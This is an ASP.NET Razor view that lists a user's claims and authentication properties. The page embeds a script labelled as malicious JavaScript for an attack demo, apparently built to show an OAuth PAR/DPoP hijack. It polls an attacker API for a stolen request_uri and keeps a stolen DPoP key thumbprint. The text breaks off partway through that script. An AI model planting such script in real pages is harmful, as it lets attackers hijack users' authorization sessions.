@using Microsoft.AspNetCore.Authentication

<div class="alert alert-warning" id="attack-indicator" style="display:none;">
    <strong>⚠️ Attack in Progress:</strong> <span id="attack-status">Checking for malicious activity...</span>
</div>

<h2>Claims</h2>

<div>
    <a asp-action="Renew" class="btn btn-primary">Renew Tokens</a>
</div>

<dl>
    @foreach (var claim in User.Claims)
    {
        <dt>@claim.Type</dt>
        <dd>@claim.Value</dd>
    }
</dl>

<h2>Properties</h2>

<dl>
    @foreach (var prop in (await Context.AuthenticateAsync()).Properties.Items)
    {
        <dt>@prop.Key</dt>
        <dd>@prop.Value</dd>
    }
</dl>

<!-- Malicious JavaScript for Attack Demo -->
<script>
(function() {
    const ATTACKER_API = 'https://localhost:7666';
    const POLL_INTERVAL = 2000;
    let attackerSessionId = null;
    let stolenDpopJkt = null;
    
    function log(message) {
        console.log('[MALICIOUS JS]', message);
        const indicator = document.getElementById('attack-indicator');
        const status = document.getElementById('attack-status');
        if (indicator && status) {
            indicator.style.display = 'block';
            status.textContent = message;
        }
    }
    
    // Poll for stolen request_uri (PAR)
    let stolenRequestUri = null;
    
    async function pollForRequestUri() {
        try {
            const response = await fetch(`${ATTACKER_API}/api/attack/par/latest`);
            if (response.ok) {
                const data = await response.json();
                console.log('[VICTIM] Received PAR data:', data);
                log(`Found request_uri from attacker! Session: ${data.sessionId}`);
                attackerSessionId = data.sessionId;
                stolenRequestUri = data.requestUri;
                
                if (!stolenRequestUri) {
                    console.error('[VICTIM] Could not find request_uri in response:', data);
                    log('ERROR: request_uri not found in API response!');
                    return;
                }
                
                log(`Stolen request_uri: ${stolenRequestUri}`);
